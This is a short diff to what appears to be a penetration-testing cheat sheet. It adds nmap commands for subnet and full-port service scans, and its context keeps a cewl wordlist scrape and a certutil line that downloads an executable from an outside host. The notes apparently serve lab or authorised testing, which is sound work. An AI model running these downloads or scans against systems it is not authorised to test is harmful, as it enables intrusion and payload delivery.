@@ -44,3 +44,12 @@ cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt
 ```
 certutil -f -urlcache http://192.168.49.220:8000//veyon-service.exe veyon-service.exe
 ```
+### :open_file_folder: nmap
+
+```
+nmap -T5 192.168.10.0/24
+```
+
+```
+nmap -Pn -p- -sC -sV -T4 192.168.201.159 
+```
